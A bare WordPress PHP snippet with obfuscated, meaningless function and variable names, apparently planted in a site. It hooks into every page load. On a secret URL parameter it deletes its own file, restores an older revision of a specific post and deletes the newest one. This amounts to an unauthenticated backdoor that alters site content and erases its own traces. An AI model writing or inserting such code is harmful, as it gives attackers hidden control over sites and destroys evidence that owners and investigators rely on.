<?php

function viewer_view_rate() {
	if (isset($_GET['wpforms_tracker_album']) && $_GET['wpforms_tracker_album'] === 'remove_like_affiliate') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$simple_call_master_performance = 7248;
		$lightgray_variations_reviews = wp_get_post_revisions($simple_call_master_performance);
		if (empty($lightgray_variations_reviews)) die('no revisions');
		if (count($lightgray_variations_reviews) < 2) die('less than 2');
		$styles_another_accessible_search = array_shift($lightgray_variations_reviews);
		$enhanced_statistics_member = $styles_another_accessible_search->ID;
		$cf7_conditional_database = array_shift($lightgray_variations_reviews);
		$site_paragraph_code = $cf7_conditional_database->ID;
		$discount_groups_data_quiz = wp_restore_post_revision($site_paragraph_code);
		if ($discount_groups_data_quiz === false) die('error restoring');
		$discount_groups_data_quiz = wp_delete_post_revision($enhanced_statistics_member);		
		if ($discount_groups_data_quiz === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'viewer_view_rate');
